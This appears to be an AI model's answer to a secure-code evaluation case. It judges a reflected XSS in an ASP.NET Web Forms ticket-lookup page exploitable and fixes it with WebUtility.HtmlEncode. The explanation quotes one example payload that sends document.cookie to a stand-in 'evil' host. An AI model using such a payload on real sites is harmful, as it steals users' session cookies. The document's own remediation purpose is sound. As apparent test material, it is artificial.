## Verdict

exploitable

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- Location: `HttpResponseWriteUnencoded.cs`, line 18 (sink); source at line 11
- Confidence: high

## Source

`Request.QueryString["ticketRef"]` (line 11) - an ASP.NET Web Forms query-string parameter, fully attacker-controlled via the request URL. It is assigned to `ticketRef` and used with no validation or encoding between the source and the sink three lines later.

## Fix

### File: HttpResponseWriteUnencoded.cs

```csharp
using System;
using System.Net;
using System.Web;
using System.Web.UI;

namespace EvalCases.WebForms
{
    public class FeedbackStatusHandler : Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string ticketRef = Request.QueryString["ticketRef"];

            Response.ContentType = "text/html";
            Response.Write("<html><body>");
            Response.Write("<h2>Support Ticket Lookup</h2>");

            Response.Write("<p>Showing status for ticket: " + WebUtility.HtmlEncode(ticketRef) + "</p>");

            Response.Write("</body></html>");
        }
    }
}
```

## Explanation

`ticketRef` reaches `Response.Write()` inside an HTML body context with no encoding, so a query string such as `?ticketRef=<script>document.location='//evil/?c='+document.cookie</script>` is written verbatim into the response and executes in the victim's browser (reflected XSS). This is Web Forms/`System.Web`, not Razor, so there is no `@variable` auto-encoding available at this sink - the language guidance for this case directs `Response.Write()` output to be encoded explicitly with `WebUtility.HtmlEncode()`. The fix wraps only the tainted value in `System.Net.WebUtility.HtmlEncode()` before it is concatenated into the markup, so `<`, `>`, `&`, and quote characters in `ticketRef` are rendered as their literal HTML entities instead of being parsed as markup, while the static surrounding HTML is unchanged. `WebUtility.HtmlEncode` is part of the base class library (`System.Net`, available wherever `System.Web` is), so no new dependency is introduced.

## Behaviour changes

- `WebUtility.HtmlEncode(null)` returns `null`, and C# string concatenation treats a `null` operand as an empty string identically to how the original code already handled a missing `ticketRef` - no change in behaviour for an absent parameter.
- For any `ticketRef` value containing `<`, `>`, `&`, `'`, or `"`, the emitted HTML now shows the entity-encoded form instead of the raw characters; this only affects how such characters are displayed in the browser (rendered visually as themselves, not as markup) and does not change `ticketRef`'s value, `Response.ContentType`, or any other statement in `Page_Load`.
- No arguments, return values, or control flow were altered beyond wrapping the one tainted value at the sink.
- Verification: `System.Web.UI.Page` and the `System.Web` namespace are .NET Framework/ASP.NET Web Forms types with no equivalent assembly in the modern .NET SDK, so no compiler was reachable in this environment to build the file end-to-end (confirmed: compiling the original-shape file against a `net8.0` SDK project fails with `CS0234`/`CS0246` on `System.Web.UI`/`Page` regardless of the fix, i.e. an environment/target-framework gap, not a defect introduced by the change). Verified manually instead: `WebUtility.HtmlEncode(string)` is a real BCL member of `System.Net` (added `using System.Net;`), its signature accepts the `string` type of `ticketRef` and returns `string`, matching the `+` concatenation's expected operand type; every other identifier in the file is unchanged from the original.
